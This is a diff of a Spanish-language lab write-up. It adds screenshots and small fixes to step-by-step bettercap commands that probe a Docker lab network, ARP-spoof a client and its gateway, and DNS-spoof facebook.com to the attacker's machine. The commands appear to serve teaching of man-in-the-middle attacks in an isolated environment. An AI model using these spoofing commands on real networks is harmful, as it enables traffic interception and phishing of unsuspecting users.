@@ -10,26 +10,42 @@ Levantamos el entorno con `sudo docker-compose up –d –build`  y comenzamos e
 
 - Comenzamos el ataque: en la máquina atacante ejecutamos `bettercap -iface eth0`. Seguidamente, ejecutamos `net.probe on` para detectar el resto de dispositivos en la red.  
 
-- Para visualizar estos dispositivos, ejecutamos `net.show`. 
+![](Pasted%20image%2020241112120351.png)
 
+- Para visualizar estos dispositivos, ejecutamos `net.show`.
+ 
+![](Pasted%20image%2020241112120412.png)
 - Ahora haremos un arp spoofing. Para ello, ejecutamos:
 ```bash
 set arp.spoof.targets 172.21.0.2, 172.21.0.100
-arp.spoof on.  
+arp.spoof on
 ```
-- Como vemos, el cliente tiene la direccion MAC del atacante como si fuera la del gateway en su caché ARP. 
+
+![](Pasted%20image%2020241112120532.png)
+- Como vemos después de ejecutar algo que pase por el router, como un ping 8.8.8.8, el cliente tiene la direccion MAC del atacante como si fuera la del gateway en su caché ARP.
+
+![](Pasted%20image%2020241112120644.png)
 
 - Para efectuar el dns spoofing, ahora escribimos los comandos
 ```bash
 set dns.spoof.domains facebook.com
 set dns.spoof.address 172.21.0.101
-dns.spoof on. 
+dns.spoof on
 ```
+
+![](Pasted%20image%2020241112120736.png)
+
 - Al hacer dig facebook.com, el cliente encontrará la IP del atacante. 
+
+![](Pasted%20image%2020241112120819.png)
 
 - Y al usar el navegador, `lynx facebook.com`, verá la página web del atacante.  
 
+![](Pasted%20image%2020241112120853.png)
+
 - Para ambas situaciones, en intrerfaz de bettercap veremos lo siguiente: 
+
+![](Pasted%20image%2020241112120921.png)
 
  
 
